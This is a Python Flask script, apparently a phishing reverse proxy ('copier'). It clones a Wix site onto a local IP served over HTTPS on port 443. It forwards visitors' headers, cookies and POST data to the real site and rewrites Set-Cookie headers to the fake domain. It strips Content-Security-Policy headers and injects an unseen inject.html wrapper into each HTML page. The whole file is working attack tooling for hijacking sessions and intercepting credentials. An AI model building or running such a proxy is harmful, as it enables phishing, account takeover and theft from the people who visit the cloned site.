from flask import Flask,render_template,request,make_response,redirect
import requests
import base64
import re

app = Flask(__name__)
HTTP_METHODS = ['GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH']

@app.route('/', defaults={'u_path': ''}, methods=HTTP_METHODS)
@app.route('/<string:u_path>', methods=HTTP_METHODS)
@app.route('/<path:u_path>', methods=HTTP_METHODS)
def main(u_path):
	domain = "www.wix.com"
	baseUrl = "https://"+domain
	path = "demone2/phone-and-tablet"
	url = request.args.get("_URL_")
	if url:
		if domain in url:
			url = url.replace("192.168.1.208", domain)
		elif "192.168.1.208" not in url:
			url = f"https://192.168.1.208/{url}"
	else:	
		url = baseUrl + "/" + (u_path if u_path else path)
		query = request.query_string.decode("utf8")
		if query:
			url += "?" + query

	headers = {}
	for header in request.headers:
		k, v = header
		if k.lower() not in ['connection', 'host']:
			headers[k] = v
			if 'cookie' == k.lower():
				# TODO: replace domaint in cookie wisely
				headers[k].replace('192.168.1.208', domain)

	if request.method == 'GET':
		response = requests.get(url, headers=headers, allow_redirects=True, verify=False)
	elif request.method == "POST":
		response = requests.post(url, headers=headers, data=request.data, allow_redirects=True, verify=False)
		print(response.content, flush=True)
	else:
		raise Exception("unsupported method")

	print("URL (orig) = "+request.full_path + "\n" + "URL (repl) = "+url + "\n" + "URL (code) = "+str(response.status_code)+"\n", flush=True)

	data = response.content
	rtype = response.headers['content-type']

	if 'text' in rtype or 'application/javascript' in rtype:
		data = data.decode("utf8")
		data = data.replace(domain, '192.168.1.208')
		# escaping and cookies
		#data = re.sub("\"(https\:\/\/.*)\"", "\"https://192.168.1.208?_URL_=\g<1>\"", data)
		data = data.encode("utf8")
	if 'text/html' in rtype and not ".js" in url:
		wrapper = open("/root/Desktop/copier/inject.html").read() \
			.replace('{HTML}', base64.b64encode(data).decode("utf8")) \
			.replace('{DOMAIN_ORIG}', domain) \
			.replace('{DOMAIN_FAKE}', "192.168.1.208")
		# first - wrapper, after - original content
		data = wrapper + data.decode("utf8")

	responseFake = make_response(data)
	for header in response.headers:
		if header.lower() not in ['content-length', 'content-encoding', 'content-security-policy', 'cross-origin-opener-policy']:
			responseFake.headers[header] = response.headers[header]
			if header.lower() == 'set-cookie':
				responseFake.headers[header] = responseFake.headers[header] \
					.replace(domain, "192.168.1.208")
				print(responseFake.headers[header])
	#print(responseFake.headers['content-type'], flush=True)
	#print(responseFake.headers, flush=True)
	responseFake.headers['Access-Control-Allow-Origin'] = '*'
	return responseFake

app.run(host='0.0.0.0', debug=True, ssl_context=('/root/Desktop/copier/cert.pem', '/root/Desktop/copier/key.pem'), port=443)